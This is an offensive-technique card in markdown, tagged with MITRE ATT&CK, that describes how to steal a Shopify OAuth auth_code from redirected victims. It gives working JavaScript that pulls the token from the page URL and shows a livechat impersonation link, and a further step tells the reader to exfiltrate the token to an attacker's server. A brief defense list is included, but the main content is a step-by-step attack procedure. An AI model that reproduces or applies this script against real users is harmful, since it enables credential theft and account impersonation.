---
tags:
  - javascript
  - token-extraction
  - url-parsing
type: procedure
tactics:
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - Web
  - Shopify
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Steal Application Access Token]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:25:17.805Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 2b67489c-f4d9-4c05-a086-c99531ec170f
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Steal Application Access Token]]'
  - '[[JavaScript]]'
---
# Extract-Access-Token-via-JavaScript-on-Attacker-Shop

## Summary

This procedure uses client-side JavaScript embedded in the attacker's Shopify shop to parse the incoming URL and extract the OAuth access token exposed in the query parameters.

## Description

After redirection, the victim's browser loads the attacker's shop page, which contains JavaScript to match and capture the auth_code from window.location.search. The token is then alerted or written to the DOM, allowing the attacker to log or exfiltrate it remotely. This exploits the lack of token sanitization in redirects.

## Requirements

1. Control over the Shopify shop's page content (JS injection)
2. Incoming redirect with auth_code parameter
3. Basic JavaScript for URL parsing

## Defense

Defensive measures and detection strategies:

- Sanitize and validate all redirect URIs strictly
- Avoid exposing tokens in URL parameters; use postMessage or secure storage
- Monitor for anomalous JS execution on shop pages

## Objectives

1. Parse auth_code from URL query
2. Capture and store the token
3. Prepare for impersonation in next phase

## Instructions

### Step 1: Embed JavaScript in Attacker's Shop Page

**Context**: Add JS to the shop's HTML to run on page load.

Insert the following script:

```javascript
var token = window.location.search.match(/auth_code=([^&]+)/);
if(token && token.length > 1){
  alert("Your access token is: " + token[1]);
  document.write("Attacker can use it to chat with support agents as you and he will be able to get your email <br> <b>Go to https://livechat.shopify.com/customer/chats/new?auth_type=chat&auth_code=" + token[1]);
}
```

> Script matches and extracts auth_code; alerts for immediate visibility or writes to DOM.

### Step 2: Capture the Extracted Token

**Context**: When victim loads the page, JS executes; attacker retrieves via logs or remote call.

Enhance script to send token to attacker's server (e.g., via fetch to exfil endpoint).

> Token is now available for use in livechat impersonation.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Steal Application Access Token]] Steal Application Access Token
- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[JavaScript]]
- [[token-extraction]]
